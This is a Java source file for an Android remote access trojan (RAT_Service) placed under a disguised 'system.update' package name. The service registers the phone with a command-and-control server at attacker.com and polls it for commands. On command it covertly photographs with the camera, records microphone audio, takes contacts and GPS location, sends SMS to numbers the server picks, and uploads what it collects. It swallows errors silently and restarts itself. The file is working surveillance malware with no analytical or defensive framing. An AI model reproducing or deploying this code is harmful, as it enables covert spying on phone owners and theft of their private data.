package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import com.google.gson.Gson;
import okhttp3.*;
import java.io.*;
import java.util.*;

public class RAT_Service extends Service {

    private static final String C2_SERVER = "https://attacker.com:8080";
    private String deviceId;
    private Handler handler;
    private Runnable commandListener;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = Build.SERIAL;
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        registerDevice();
        startCommandListener();
        return START_STICKY;
    }

    private void registerDevice() {
        new Thread(() -> {
            try {
                Map<String, String> data = new HashMap<>();
                data.put("device_id", deviceId);
                data.put("model", Build.MODEL);
                data.put("android_version", Build.VERSION.RELEASE);
                data.put("timestamp", String.valueOf(System.currentTimeMillis()));

                OkHttpClient client = new OkHttpClient();
                RequestBody body = RequestBody.create(
                    new Gson().toJson(data),
                    MediaType.parse("application/json")
                );

                Request request = new Request.Builder()
                    .url(C2_SERVER + "/register")
                    .post(body)
                    .build();

                client.newCall(request).execute();
            } catch(Exception e) {}
        }).start();
    }

    private void startCommandListener() {
        commandListener = new Runnable() {
            @Override
            public void run() {
                try {
                    fetchAndExecuteCommand();
                } catch(Exception e) {}
                handler.postDelayed(this, 5000);
            }
        };
        handler.post(commandListener);
    }

    private void fetchAndExecuteCommand() {
        new Thread(() -> {
            try {
                OkHttpClient client = new OkHttpClient();
                Request request = new Request.Builder()
                    .url(C2_SERVER + "/cmd?device_id=" + deviceId)
                    .build();

                Response response = client.newCall(request).execute();
                String cmd = response.body().string();

                if(cmd != null && !cmd.isEmpty()) {
                    executeCommand(cmd);
                }
            } catch(Exception e) {}
        }).start();
    }

    private void executeCommand(String cmd) {
        if(cmd.contains("lock_screen")) {
            lockScreen();
        }
        else if(cmd.contains("flash_on")) {
            turnFlashlightOn();
        }
        else if(cmd.contains("flash_off")) {
            turnFlashlightOff();
        }
        else if(cmd.contains("camera_capture")) {
            captureCamera();
        }
        else if(cmd.contains("audio_record")) {
            recordAudio();
        }
        else if(cmd.contains("get_contacts")) {
            stealContacts();
        }
        else if(cmd.contains("send_sms")) {
            executeSMSCommand(cmd);
        }
        else if(cmd.contains("get_location")) {
            getLocation();
        }
    }

    private void lockScreen() {
        android.app.DevicePolicyManager dpm = 
            (android.app.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        android.content.ComponentName admin = 
            new android.content.ComponentName(this, AdminReceiver.class);
        
        if(dpm.isAdminActive(admin)) {
            dpm.lockNow();
        }
    }

    private void turnFlashlightOn() {
        new Thread(() -> {
            try {
                Camera camera = Camera.open();
                Camera.Parameters params = camera.getParameters();
                params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
                camera.setParameters(params);
                camera.startPreview();
            } catch(Exception e) {}
        }).start();
    }

    private void turnFlashlightOff() {
        new Thread(() -> {
            try {
                Camera camera = Camera.open();
                Camera.Parameters params = camera.getParameters();
                params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
                camera.setParameters(params);
                camera.stopPreview();
                camera.release();
            } catch(Exception e) {}
        }).start();
    }

    private void captureCamera() {
        new Thread(() -> {
            try {
                Camera camera = Camera.open();
                camera.takePicture(null, null, (data, camera1) -> {
                    try {
                        File file = new File(getExternalFilesDir(null), "photo.jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data);
                        fos.close();
                        uploadFile(file.getAbsolutePath());
                    } catch(IOException e) {}
                });
            } catch(Exception e) {}
        }).start();
    }

    private void recordAudio() {
        new Thread(() -> {
            try {
                MediaRecorder recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                
                File audioFile = new File(getExternalFilesDir(null), "audio.3gp");
                recorder.setOutputFile(audioFile.getAbsolutePath());
                recorder.prepare();
                recorder.start();

                Thread.sleep(30000);
                recorder.stop();
                recorder.release();

                uploadFile(audioFile.getAbsolutePath());
            } catch(Exception e) {}
        }).start();
    }

    private void stealContacts() {
        new Thread(() -> {
            try {
                android.content.ContentResolver resolver = getContentResolver();
                android.database.Cursor cursor = resolver.query(
                    android.provider.ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null
                );

                StringBuilder contacts = new StringBuilder();
                if(cursor != null) {
                    while(cursor.moveToNext()) {
                        String name = cursor.getString(
                            cursor.getColumnIndex(android.provider.ContactsContract.Contacts.DISPLAY_NAME)
                        );
                        contacts.append(name).append("\n");
                    }
                    cursor.close();
                }

                uploadData("contacts", contacts.toString());
            } catch(Exception e) {}
        }).start();
    }

    private void executeSMSCommand(String cmd) {
        String[] parts = cmd.split("\\|");
        if(parts.length >= 3) {
            String phone = parts[1];
            String message = parts[2];

            android.telephony.SmsManager sms = android.telephony.SmsManager.getDefault();
            sms.sendTextMessage(phone, null, message, null, null);
        }
    }

    private void getLocation() {
        new Thread(() -> {
            try {
                android.location.LocationManager lm = 
                    (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
                
                android.location.Location location = lm.getLastKnownLocation(
                    android.location.LocationManager.GPS_PROVIDER
                );

                if(location != null) {
                    String data = "LAT:" + location.getLatitude() + 
                                 ",LON:" + location.getLongitude();
                    uploadData("location", data);
                }
            } catch(Exception e) {}
        }).start();
    }

    private void uploadFile(String filePath) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                OkHttpClient client = new OkHttpClient();

                RequestBody fileBody = RequestBody.create(file, MediaType.parse("application/octet-stream"));
                MultipartBody.Builder builder = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.getName(), fileBody)
                    .addFormDataPart("device_id", deviceId);

                Request request = new Request.Builder()
                    .url(C2_SERVER + "/upload")
                    .post(builder.build())
                    .build();

                client.newCall(request).execute();
            } catch(Exception e) {}
        }).start();
    }

    private void uploadData(String type, String data) {
        new Thread(() -> {
            try {
                Map<String, String> payload = new HashMap<>();
                payload.put("device_id", deviceId);
                payload.put("type", type);
                payload.put("data", data);

                OkHttpClient client = new OkHttpClient();
                RequestBody body = RequestBody.create(
                    new Gson().toJson(payload),
                    MediaType.parse("application/json")
                );

                Request request = new Request.Builder()
                    .url(C2_SERVER + "/data")
                    .post(body)
                    .build();

                client.newCall(request).execute();
            } catch(Exception e) {}
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}